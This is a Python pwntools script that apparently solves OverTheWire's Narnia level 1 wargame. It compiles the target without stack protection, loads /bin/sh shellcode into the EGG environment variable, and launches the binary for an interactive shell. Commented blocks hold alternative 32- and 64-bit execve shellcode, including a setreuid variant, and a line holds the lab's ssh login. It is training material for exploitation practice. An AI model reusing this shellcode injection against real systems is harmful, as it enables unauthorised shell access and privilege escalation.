#!/usr/bin/env python
from pwn import *
import os

# Define the context of the working machine
context(arch='i386', os='linux')
# context(arch='amd64', os='linux')

# # Download the i386 binary
# s = ssh(user='narnia1', host='narnia.labs.overthewire.org', password='efeidiedae', port=2226)
# s.download("/narnia/narnia1")

# Compile the binary
log.info("Compiling the binary narnia1_local")
# os.system('gcc narnia1.c -g -o narnia1_local -fno-stack-protector -z execstack')
os.system('gcc narnia1.c -g -m32 -o narnia1_local -fno-stack-protector -z execstack')

# Get a simple shellcode
log.info("Putting together simple shellcode")
shellcode = asm(shellcraft.sh())
print(asm(shellcraft.sh()))

# # setreuid(geteuid(),geteuid()),execve("/bin/sh",0,0) 34byte universal shellcode, 32 bits
# #   Fetched from http://shell-storm.org/shellcode/files/shellcode-399.php
# sh_shellcode = """
#         push $0x31
#         pop %eax
#         cltd
#         int $0x80
#         mov %eax, %ebx
#         mov %eax, %ecx
#         push $0x46
#         pop %eax
#         int $0x80
#         mov $0xb, %al
#         push %edx
#         push $0x68732f6e
#         push $0x69622f2f
#         mov %esp, %ebx
#         mov %edx, %ecx
#         int $0x80
# """

# # Linux/x86_64 execve("/bin/sh"); 30 bytes shellcode
# #   Fetched from http://shell-storm.org/shellcode/files/shellcode-603.php
# sh_shellcode = """
#             xor     rdx, rdx
#             mov     qword rbx, '//bin/sh'
#             shr     rbx, 0x8
#             push    rbx
#             mov     rdi, rsp
#             push    rax
#             push    rdi
#             mov     rsi, rsp
#             mov     al, 0x3b
#             syscall
# """

# e = ELF.from_assembly(sh_shellcode, vma=0x400000, arch='amd64')


log.info("Introduce shellcode in EGG env. variable")
os.environ["EGG"] = shellcode

log.info("Launching narnia1_local")
# binary = ELF('narnia1_local', checksec=False)
sh = process('narnia1_local')
sh.interactive()
